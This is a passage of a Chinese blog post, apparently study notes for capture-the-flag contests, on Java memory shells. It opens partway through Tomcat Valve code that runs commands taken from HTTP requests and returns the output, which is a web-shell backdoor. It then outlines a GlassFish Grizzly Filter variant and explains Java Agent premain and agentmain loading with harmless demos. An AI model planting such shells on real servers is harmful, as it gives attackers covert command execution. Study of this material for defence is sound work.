class="line">                        cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    java.util.<span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.util.Scanner(in).useDelimiter(<span class="string">&quot;\\a&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    java.io.<span class="type">Writer</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">                    response.getWriter().write(<span class="string">&quot;smail evil valve isComing!!!\n&quot;</span>);</span><br><span class="line">                    writer.write(output);</span><br><span class="line">                    writer.flush();</span><br><span class="line">                    writer.close();</span><br><span class="line">                    <span class="built_in">this</span>.getNext().invoke(request, response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h2 id="九、GlassFish-Grizzly-Filter-内存马"><a href="#九、GlassFish-Grizzly-Filter-内存马" class="headerlink" title="九、GlassFish Grizzly Filter 内存马"></a>九、GlassFish Grizzly Filter 内存马</h2><p>（这个组件的内存马，网上资料相当少啊。。）</p>
<p>需要去下一个glassfish来做容器，我一直以为是maven添加依赖。。。找了我好几个小时。。我装的5.0版本的</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/as403045314/article/details/101337299" >(55条消息) Glassfish安装、基本使用、在idea中配置Glassfish_as403045314的博客-CSDN博客 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>（这文章里面不用全看，就当个下载链接即可，glassfish和tomcat配置方法差不多,我本地跑glassfish会报错，鼓捣了半天，还是报错，先不搞这个了，以后比赛出现 GlassFish 容器再说，我把内存马记一下）</p>
<p>GlassFish 使用 grizzly 组件来完成 NIO 的工作，类似 Tomcat 中的 connector 组件。在 HTTP 下，grizzly 负责解析和序列化 HTTP 请求&#x2F;响应，grizzly 有职责链设计模式的体现，类似Tomcat的Pipeline和Valve，提供了 Filter 和 FilterChain 等接口及实现，就可以被用来写入内存马。</p>
<p>可以采用是通过 <code>HttpServletRequest</code> 最终获取<code>grizzlyRequest</code>，调用其 <code>addAfterServiceListener</code></p>
<p>在 <code>AfterServiceListener</code> 的 <code>onAfterService</code> 中拿到 <code>filterChain</code> 并添加恶意Filter：</p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-4566c0d4919a1fdefc28876fd5ec7c3a00bd3e86c83526f06085284f82246763" >GlassFish Filter <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link"   target="_blank" rel="noopener" href="https://github.com/su18/MemoryShell/commit/38ffaf43782176c47044f588164923c3c5a36b8b#diff-dd129e104398383810d8bb6b2ae114d349893a803c35baeee0e4c05450b50a17" >GlassFish ServiceList <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="十、Java-Agent-内存马"><a href="#十、Java-Agent-内存马" class="headerlink" title="十、Java Agent 内存马"></a>十、Java Agent 内存马</h2><p><a class="link"   target="_blank" rel="noopener" href="http://wjlshare.com/archives/1582" >浅谈 Java Agent 内存马 – 天下大木头 (wjlshare.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>Java Agent 支持两种方式进行加载：</p>
<blockquote>
<p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p>
<p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有），主要结合 ClassFileTransformer 接口</p>
</blockquote>
<h3 id="1、java-agent两个加载方式介绍"><a href="#1、java-agent两个加载方式介绍" class="headerlink" title="1、java agent两个加载方式介绍"></a>1、java agent两个加载方式介绍</h3><p>本质是一个jar包中的类，有两种实现，第一种是通过permain()函数实现。这种javaagent会在宿主程序的main函数的启动前启动自己premain函数，这时候会得到一个Instrumentation对象，我们可以通过Instrumentation对象对还未加载的class进行拦截与修改。</p>
<p>还有一种实现方式是利用agentmain()函数。VirtualMachine类的attach(pid)方法可以将当前进程attach到一个运行中的java进程上，接着利用loadAgent(agentJarPath)来将含符合格式且含有agentmain函数的jar包注入到对应的进程，调用loadAgent函数后，对应的进程中会多出一个Instrumentation对象，这个对象会被当作agentmain的一个参数。<br>对应进程接着会调用agentmain函数，进而操作Instrumentation对象，Instrumentation对象可以在class加载前拦截字节码进行修改，也可以对已经加载的class重新让它加载，并拦截且修改其中的内容，跟进程注入差不多，具体做什么操作，取决于我们的jar文件中的agentmain函数怎么写。</p>
<p><strong>Instrumentation 的部分重要方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h3 id="2、几个重要的类："><a href="#2、几个重要的类：" class="headerlink" title="2、几个重要的类："></a>2、几个重要的类：</h3><p>Instrumentation对象实现对class的修改操作是依赖于ClassFileTransformer接口中的transform函数。</p>
<p>ClassFileTransformer 对象会被当作参数传给 Instrumentation.addTransformer 函数。此时 Instrumentation.addTransformer  函数其实执行的是其中 ClassFileTransformer 的transform函数。</p>
<h4 id="ClassFileTransformer-接口"><a href="#ClassFileTransformer-接口" class="headerlink" title="ClassFileTransformer 接口"></a><strong>ClassFileTransformer 接口</strong></h4><blockquote>
<p>ClassFileTransformer 接口为转换类文件的代理接口。提供了 <code>transform()</code> 方法用于修改原类的注入。<br>我们可以在获取到 Instrumentation 对象后通过 <code>addTransformer()</code> 方法添加自定义类文件转换器。</p>
</blockquote>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 类文件转换方法，重写transform方法可获取到待加载的类相关信息</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loader              定义要转换的类加载器；如果是引导加载器，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> className           类名,如:java/lang/Runtime</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classBeingRedefined 如果是被重定义或重转换触发，则为重定义或重转换的类；如果是类加载，则为 null</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> protectionDomain    要定义或重定义的类的保护域</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> classfileBuffer     类文件格式的输入字节缓冲区（不得修改）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 返回一个通过ASM修改后添加了防御代码的字节码byte数组。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="type">byte</span>[] transform(  ClassLoader loader, </span><br><span class="line">                String className,</span><br><span class="line">                Class&lt;?&gt; classBeingRedefined,</span><br><span class="line">                ProtectionDomain protectionDomain,</span><br><span class="line">                <span class="type">byte</span>[] classfileBuffer)</span><br><span class="line">        <span class="keyword">throws</span> IllegalClassFormatException;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>重写 <code>transform()</code> 方法需要注意以下事项：</strong></p>
<ol>
<li>ClassLoader 如果是被 Bootstrap ClassLoader (引导类加载器)所加载那么 loader 参数的值是空。</li>
<li>修改类字节码时需要特别注意插入的代码在对应的 ClassLoader 中可以正确的获取到，否则会报 ClassNotFoundException ，比如修改 java.io.FileInputStream (该类由 Bootstrap ClassLoader 加载)时插入了我们检测代码，那么我们将必须保证 FileInputStream 能够获取到我们的检测代码类。</li>
<li>JVM类名的书写方式路径方式：<code>java/lang/String</code> 而不是我们常用的类名方式：<code>java.lang.String</code>。</li>
<li>类字节必须符合 JVM 校验要求，如果无法验证类字节码会导致 JVM 崩溃或者 VerifyError (类验证错误)。</li>
<li>如果修改的是 retransform 类(修改已被 JVM 加载的类)，修改后的类字节码不得新增方法、修改方法参数、类成员变量。</li>
<li><code>addTransformer</code> 时如果没有传入 retransform 参数(默认是 false )，就算 MANIFEST.MF 中配置了 <code>Can-Redefine-Classes: true</code> 而且手动调用了<code>retransformClasses()</code>方法也一样无法retransform。</li>
<li>卸载 transform 时需要使用创建时的 Instrumentation 实例。</li>
</ol>
<p><strong>还需要理解的是，在以下三种情形下 <code>ClassFileTransformer.transform()</code> 会被执行：</strong></p>
<ol>
<li>新的 class 被加载。</li>
<li><code>Instrumentation.redefineClasses</code> 显式调用。</li>
<li><code>addTransformer</code> 第二个参数为 true 时，<code>Instrumentation.retransformClasses</code> 显式调用。</li>
</ol>
<h4 id="VirtualMachine"><a href="#VirtualMachine" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">VirtualMachine</span> &#123;</span><br><span class="line">    <span class="comment">// 获得当前所有的JVM列表</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> List&lt;VirtualMachineDescriptor&gt; <span class="title function_">list</span><span class="params">()</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据pid连接到JVM</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> VirtualMachine <span class="title function_">attach</span><span class="params">(String id)</span> &#123; ... &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 断开连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加载agent，agentmain方法靠的就是这个方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">loadAgent</span><span class="params">(String agent)</span> &#123; ... &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h4 id="CtMethod"><a href="#CtMethod" class="headerlink" title="CtMethod"></a>CtMethod</h4><p>可以理解成加强版的Method对象。</p>
<p>获得方法：CtMethod m &#x3D; cc.getDeclaredMethod(MethodName)。</p>
<p>这个类提供了一些方法，使我们可以便捷的修改方法体：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">CtMethod</span> <span class="keyword">extends</span> <span class="title class_">CtBehavior</span> &#123;</span><br><span class="line">    <span class="comment">// 主要的内容都在父类 CtBehavior 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 父类 CtBehavior</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">CtBehavior</span> <span class="keyword">extends</span> <span class="title class_">CtMember</span> &#123;</span><br><span class="line">    <span class="comment">// 设置方法体</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setBody</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最前面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertBefore</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 插入在方法体最后面</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insertAfter</span><span class="params">(String src)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在方法体的某一行插入内容</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">insertAt</span><span class="params">(<span class="type">int</span> lineNum, String src)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h3 id="3、启动时加载-agent——premain"><a href="#3、启动时加载-agent——premain" class="headerlink" title="3、启动时加载 agent——premain"></a>3、启动时加载 agent——premain</h3><p><strong>——利用premain函数实现java agent</strong></p>
<p>Javaagent 是 java 命令的一个参数。参数 javaagent 可以用于指定一个 jar 包，并且对该 java 包有2个要求：</p>
<blockquote>
<ul>
<li>这个 jar 包的 MANIFEST.MF 文件必须指定 Premain-Class 项。</li>
<li>Premain-Class 指定的那个类必须实现 premain() 方法。</li>
</ul>
</blockquote>
<p>拦截到的class文件会被转化为字节码，然后传给premain函数，premain函数中可以调用Instrumentation类中的函数对刚刚传送进来的字节码进行操作。等到操作结束会将字节码给jvm加载。</p>
<blockquote>
<p>( premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法)</p>
</blockquote>
<p>且 <code>premain</code> 函数格式如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static void premain(String agentArgs, Instrumentation inst)</span><br></pre></td></tr></table></figure></div>



<h4 id="小demo尝试"><a href="#小demo尝试" class="headerlink" title="小demo尝试"></a>小demo尝试</h4><p><strong>1.创建一个类，需要实现premain方法</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">premainDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        System.out.println(agentArgs);</span><br><span class="line">        System.out.println(<span class="string">&quot;koishi 的 premaindemo 来喽&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>2.接下来创建 mainfest，这里将其保存为 agent.mf ，一定要含有 Premain-Class 属性</strong></p>
<p>（ps：注意这里的 mf 一定要有空行）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Premain-Class: premainDemo</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<p>**3.利用 javac 将 java 文件编译成 class 之后，利用 jar 命令打包，生成我们的 agent.jar **</p>
<p><strong><font color="red">(打class的时候 java 文件一定一定不要带上package信息，不然会出现找不到类的报错)</font></strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac .\premainDemo_Say.java</span><br><span class="line">jar cvfm agent.jar cirno.mf .\premainDemo_Say.class</span><br></pre></td></tr></table></figure></div>



<p><strong>4.然后创建一个普通类作为测试 demo</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Java_Agent.premain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiNice</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>Ilyn.mf</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: KoishiNice</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>同样的利用 javac 编译之后打包成 Ilyn.jar</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac .\KoishiNice.java</span><br><span class="line">jar cvfm Ilyn.jar Ilyn.mf .\KoishiNice.class</span><br></pre></td></tr></table></figure></div>

<p>最终得到了 agent.jar 和  Ilyn.jar</p>
<p>接下来我们只需要在 <code>java -jar</code> 中添加 <code>-javaagent:agent.jar</code> 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar[=options] -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>

<p>测试看看</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:agent.jar=&quot;Please be careful, because Koishi is looking at you&quot; -jar Ilyn.jar</span><br></pre></td></tr></table></figure></div>





<h4 id="动态修改字节码"><a href="#动态修改字节码" class="headerlink" title="动态修改字节码"></a>动态修改字节码</h4><p>在demo处，我们可以发现，在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，复习一下</p>
<p><strong><font color="brown">Instrumentation</font></strong></p>
<p>Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果</p>
<p>在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据。Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码。上文介绍的 transform 的注意点也别忘了。再把几个方法粘一下。</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Instrumentation</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除一个类转换器</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">removeTransformer</span><span class="params">(ClassFileTransformer transformer)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">retransformClasses</span><span class="params">(Class&lt;?&gt;... classes)</span> <span class="keyword">throws</span> UnmodifiableClassException;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断目标类是否能够修改。</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isModifiableClass</span><span class="params">(Class&lt;?&gt; theClass)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取目标已经加载的类。</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;rawtypes&quot;)</span></span><br><span class="line">    Class[] getAllLoadedClasses();</span><br><span class="line"></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>Instrumentation 提供了 addTransformer，getAllLoadedClasses，retransformClasses 等方法，我们后面由于只用到了这三个所以就只介绍这三个</p>
<h5 id="addTransformer"><a href="#addTransformer" class="headerlink" title="addTransformer"></a><font color="deeppink">addTransformer</font></h5><p>addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 注册提供的转换器</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">addTransformer</span><span class="params">(ClassFileTransformer transformer)</span></span><br></pre></td></tr></table></figure></div>

<p>这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截（自己写Transformer 需要实现 ClassFileTransformer 接口）</p>
<p><strong>注意</strong>：如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Can-Retransform-Classes 是否支持类的重新替换</span><br><span class="line">Can-Redefine-Classes 是否支持类的重新定义</span><br></pre></td></tr></table></figure></div>

<p>这两个如果不添加的话，当我们执行的时候是会报错的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jar cvfm koishi.jar koishi.mf .\KoishiPremain.class;jar cvfm cirno.jar cirno.mf .\KoishiSay.class</span><br><span class="line">java -javaagent:koishi.jar=&quot;test&quot; -jar cirno.jar</span><br></pre></td></tr></table></figure></div>

<p>这里加载class我忘了去package，而且javac还找不到类，源码中的class和jar我都删了，有兴趣可以再去搞一个试试，我累了，这东西还挺麻烦的。原理和上面那个差不多，只不过多了一个transform修改源码逻辑。（后面有空了重新补上）</p>
<h3 id="4、启动后加载-agent——agentmain"><a href="#4、启动后加载-agent——agentmain" class="headerlink" title="4、启动后加载 agent——agentmain"></a>4、启动后加载 agent——agentmain</h3><p><strong>执行逻辑</strong></p>
<blockquote>
<ol>
<li>确定要attach到哪个jvm进程中</li>
<li>使用id函数确定jvm进程的pid</li>
<li>使用attach(pid)函数链接这个jvm进程</li>
<li>使用loadAgent将我们的恶意agent.jar包添加进jvm进程中</li>
<li>jvm进程会生成一个instrumentation对象并传到agent.jar包中指定类的agentmain函数中当作参数。</li>
<li>agentmain函数执行。</li>
</ol>
</blockquote>
<p><code>VirtualMachine.list()</code>方法会去寻找当前系统中所有运行着的JVM进程，你可以打印<code>displayName()</code>看到当前系统都有哪些JVM进程在运行。因为main函数执行起来的时候<code>进程名为当前类名</code>，所以通过这种方式可以去找到当前的进程id。</p>
<p>和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类 </p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs, Instrumentation inst)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span> <span class="params">(String agentArgs)</span></span><br></pre></td></tr></table></figure></div>

<p>要求和之前类似，我们需要满足以下条件</p>
<blockquote>
<ol>
<li>必须要实现 agentmain 方法</li>
<li>Jar 文件清单中必须要含有 Premain-Class 属性</li>
</ol>
</blockquote>
<p>在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。</p>
<p>来查看一下该包中的内容，这里有两个比较重要的类，分别是 VirtualMachine 和 VirtualMachineDescriptor，其中我们重点关注 VirtualMachine 类</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\20210614163630.png"
                      alt="image-20210614163630025"
                ></p>
<h4 id="VirtualMachine-1"><a href="#VirtualMachine-1" class="headerlink" title="VirtualMachine"></a>VirtualMachine</h4><p><code>VirtualMachine</code> 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法<code>LoadAgent</code>，<code>Attach</code> 和 <code>Detach</code> 。下面来看看这几个方法的作用</p>
<p><strong>Attach</strong> ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上</p>
